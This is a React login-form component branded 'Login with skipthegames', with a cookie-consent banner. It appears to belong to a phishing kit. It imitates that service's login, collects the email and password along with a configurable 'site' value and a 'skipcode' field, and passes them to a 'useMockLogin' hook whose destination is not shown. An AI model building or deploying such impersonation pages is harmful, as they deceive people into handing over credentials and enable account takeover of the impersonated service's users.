import { Field, Form, Formik } from 'formik';
import useMockLogin from '../hooks/useMockLogin';
import { site } from '../config';
import { useState, useEffect } from 'react';
import { hasCookie, setCookie } from 'cookies-next';

function LoginForm() {
  const initialvalues = {
    email: '',
    password: '',
    remember: '',
  };

  const [showConsent, setShowConsent] = useState(true);

  useEffect(() => {
    setShowConsent(hasCookie('localConsent'));
  }, []);

  const acceptCookie = () => {
    setShowConsent(true);
    setCookie('localConsent', 'true', {});
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    const { email, password } = values;
    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: '',
    };
    login(submitValues, formik);
  };

  return (
    <div>
      <div className="px-5 mx-auto mt-[200px] pt-5 lg:px-10  pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
        <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
          Login with skipthegames
        </h3>

        <div className="mt-5">
          <Formik
            initialValues={initialvalues}
            // validationSchema={validate}
            onSubmit={handleSubmit}
          >
            {formik => (
              <Form className="">
                <Field
                  className="w-full text-lg px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                  placeholder="Your email"
                  name="email"
                  type="email"
                  required
                />

                <Field
                  className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                  placeholder="Password"
                  name="password"
                  type="password"
                  autoComplete="on"
                  required
                />

                <button
                  type="submit"
                  className="mt-5 w-full text-lg font-medium bg-[#1a73e8] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 rounded"
                >
                  Log in
                </button>
              </Form>
            )}
          </Formik>
        </div>
      </div>
      <div
        className={
          showConsent ? 'hidden' : 'fixed inset-0 bg-slate-700 bg-opacity-70'
        }
      >
        <div className="fixed bottom-0 left-0 right-0 flex items-center justify-between px-4 py-8 bg-gray-100">
          <span className="text-dark text-base mr-16">
            This website uses cookies to improve user experience. By using our
            website you consent to all cookies in accordance with our Cookie
            Policy.
          </span>
          <button
            className="bg-green-500 py-2 px-8 rounded text-white"
            onClick={() => acceptCookie()}
          >
            Accept
          </button>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
